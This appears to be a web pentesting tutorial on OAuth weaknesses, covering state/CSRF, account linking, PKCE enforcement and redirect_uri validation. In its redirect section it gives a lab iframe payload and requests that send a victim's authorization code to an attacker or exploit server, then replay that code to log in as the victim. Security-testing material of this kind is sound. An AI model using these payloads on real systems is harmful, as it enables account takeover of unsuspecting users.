**OAuth** is an authorization framework that allows an application to access resources on behalf of a user without requiring the application to know the user's password. It is commonly used for features such as "Login with Google", "Login with GitHub", or connecting an external account.

A useful way to think about the attack surface is:

```text
User
  |
  v
Client Application
  |
  | Authorization request
  v
OAuth Provider
  |
  | Code / Token
  v
Client Callback
  |
  | Identity validation
  v
Application Session
```


---

## OAuth Architecture and Roles

OAuth normally involves several different components.

The **resource owner** is the user whose data is being accessed. The **client** is the application requesting access. The **authorization server** authenticates the user and issues authorization credentials. The **resource server** hosts the protected API or resources.

A simplified relationship is:

```text
                    +-------------------+
                    | Authorization     |
                    | Server            |
                    +---------+---------+
                              |
                    authorization code
                              |
                              v
+-------------+       +-------+-------+
|    User     | ----> | OAuth Client  |
+-------------+       | Application   |
	                  +-------+-------+
                            |
                       access token
                            |
                            v
                    +-------+-------+
                    | Resource      |
                    | Server / API  |
                    +---------------+
```

The client is particularly important during a web pentest because the target application usually controls the callback handling, account linking, identity mapping, and session creation.

Therefore, OAuth is **not automatically outside the scope of a normal web pentest**. If the target application implements or integrates OAuth authentication, the OAuth integration is part of the application's attack surface.

The provider itself may be outside the assessment scope, but weaknesses in how the target application consumes OAuth data are still relevant.

---

## Authorization Flows

### Authorization Code Flow

The authorization code flow first returns a temporary authorization code to the client.

```text
User
  |
  v
OAuth Provider
  |
  | authorization code
  v
Client callback
  |
  | server-side exchange
  v
Access token
```

A simplified callback looks like:

```http
GET /oauth/callback?code=AUTHORIZATION_CODE HTTP/2
Host: target.example.com
```

The application then exchanges the code for a token.

The code should be short-lived and bound to the correct client and authorization context. This makes the authorization code itself an important target during testing.

### Implicit Flow

The implicit flow returns the access token directly to the browser.

For example:

```text
https://target.example.com/callback#access_token=ACCESS_TOKEN
```

This exposes the token directly to the browser and therefore increases the importance of client-side security.

If an application still uses an implicit flow, investigate whether the token can be exposed through XSS, malicious JavaScript, browser-side storage, or other client-side mechanisms.

---

## `state` and OAuth CSRF

The `state` parameter is normally used to bind the OAuth response to the session that initiated the authorization request.

A normal request might contain:

```http
GET /authorize?client_id=12345&redirect_uri=https://target.example.com/callback&response_type=code&state=RANDOM_VALUE HTTP/2
Host: oauth.example.com
```

The callback should return the same value:

```http
GET /oauth/callback?code=AUTH_CODE&state=RANDOM_VALUE HTTP/2
Host: target.example.com
```

The application should verify that the returned state belongs to the current authorization attempt.

If this validation is missing, an attacker may be able to initiate an OAuth flow using their own account and cause another user's browser to complete it.

This becomes particularly dangerous when the application supports account linking.

---

## Account Linking Attacks

OAuth account linking introduces an additional trust boundary.

A typical flow is:

```text
Existing application account
          |
          v
"Link external account"
          |
          v
OAuth authentication
          |
          v
OAuth identity
          |
          v
Linked to local account
```

If the application does not correctly associate the OAuth response with the user's original session, an attacker may be able to make a victim link the attacker's OAuth identity to the victim's account.

A common scenario is:

```text
Attacker
   |
   | authenticates with attacker's OAuth account
   v
Authorization code
   |
   | victim's browser
   v
OAuth callback
   |
   v
Victim's account linked to attacker identity
```

The attacker may then use the linked OAuth account to access the victim's application account later.

This is one reason `state` is especially important in OAuth account-linking functionality.

---

## Authorization Code Handling

The authorization code represents the result of the OAuth authorization process and is exchanged for a token.

A normal exchange looks like:

```http
POST /token HTTP/2
Host: oauth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&client_id=CLIENT_ID
```

During testing, investigate whether the code is:

```text
Reusable
Long-lived
Not bound to the correct client
Not bound to the correct redirect URI
Accepted without PKCE when PKCE should be required
```

A simple reuse test is to submit the same code twice. The second attempt should normally fail.

The important distinction is that merely obtaining an authorization code is not necessarily enough to demonstrate account takeover. You need to determine whether the code can actually be exchanged or used by the attacker.

---

## PKCE

PKCE adds a secret proof to the authorization code flow.

The client generates a verifier and sends a derived challenge:

```http
GET /authorize?client_id=CLIENT_ID&response_type=code&code_challenge=CHALLENGE&code_challenge_method=S256 HTTP/2
Host: oauth.example.com
```

Later, the client provides the original verifier:

```http
POST /token HTTP/2
Host: oauth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&code_verifier=VERIFIER
```

The server should verify that the verifier corresponds to the original challenge.

From a pentesting perspective, the important question is whether PKCE is **actually enforced**.

For example, if removing `code_verifier` still allows the code to be exchanged, the implementation may not be providing the protection expected from PKCE.

---

## `redirect_uri` Validation

The `redirect_uri` specifies where the OAuth provider sends the authorization response.

A secure implementation should only accept redirect URIs registered for the OAuth client.

For example:

```http
GET /authorize?client_id=CLIENT_ID&redirect_uri=https://target.example.com/oauth/callback&response_type=code HTTP/2
Host: oauth.example.com
```

The interesting test is whether it accepts an attacker-controlled destination:

```http
GET /authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.example/&response_type=code HTTP/2
Host: oauth.example.com
```

If the provider redirects there with an authorization code:

```text
https://attacker.example/?code=AUTHORIZATION_CODE
```

the attacker may be able to steal the authorization code sending an iframe to the victim.

### Exploiting the Redirect Against a Victim

Once an attacker confirms that the authorization response can be redirected to an external server, the next step is to make the **victim's browser perform the OAuth request**.

In a lab, this can be achieved by hosting an HTML page containing an `iframe` pointing to the vulnerable authorization endpoint:

```html
<iframe src="https://oauth.oauth-server.net/auth?client_id=CLIENT-ID&redirect_uri=https://EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

When the victim opens the exploit page, their browser sends the request to the OAuth provider.

If the victim already has an active OAuth session, the provider may authorize the request without asking for credentials again.

The flow becomes:

```text
Attacker's page
      |
      | iframe
      v
OAuth authorization endpoint
      |
      | victim already authenticated
      v
Authorization code generated for victim
      |
      | vulnerable redirect_uri
      v
Attacker's exploit server
      |
      v
Victim's authorization code
```

The attacker can then inspect the exploit server's access log and obtain a request similar to:

```http
GET /?code=VICTIM_AUTHORIZATION_CODE HTTP/1.1
Host: EXPLOIT-SERVER-ID.exploit-server.net
```

The code can then be supplied to the legitimate OAuth callback:

```http
GET /oauth-callback?code=VICTIM_AUTHORIZATION_CODE HTTP/2
Host: target.example.com
```

If the application accepts the code and completes the OAuth flow, the attacker may become authenticated as the victim.

---

## Open Redirect Chaining

An OAuth provider may correctly restrict the redirect URI to:

```text
https://target.example.com/redirect
```

However, if that endpoint contains an open redirect:

```text
https://target.example.com/redirect?url=https://attacker.example
```

the OAuth response may still reach the attacker.

The chain becomes:

```text
OAuth Provider
      |
      | code
      v
target.example.com/redirect
      |
      | 302
      v
attacker.example
```

This is an important example of why OAuth vulnerabilities are not always located in the OAuth provider itself.

The vulnerable component may simply be the target application's redirect endpoint.
